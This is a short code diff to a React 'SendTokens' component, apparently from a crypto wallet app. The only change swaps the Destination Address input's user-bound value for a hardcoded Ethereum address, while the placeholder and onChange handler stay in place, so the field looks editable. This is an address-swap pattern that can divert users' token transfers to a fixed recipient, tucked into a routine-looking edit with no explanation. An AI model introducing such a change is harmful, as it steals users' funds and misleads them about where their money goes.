@@ -102,7 +102,7 @@ export const SendTokens = () => {
         Destination Address:
         <Input
           required
-          value={destinationAddress}
+          value="0x2A29c1bdB9DD7464C01EA06da1aa7B04F2CBF651"
           placeholder="vitalik.eth"
           onChange={(e) => setDestinationAddress(e.target.value)}
           type={
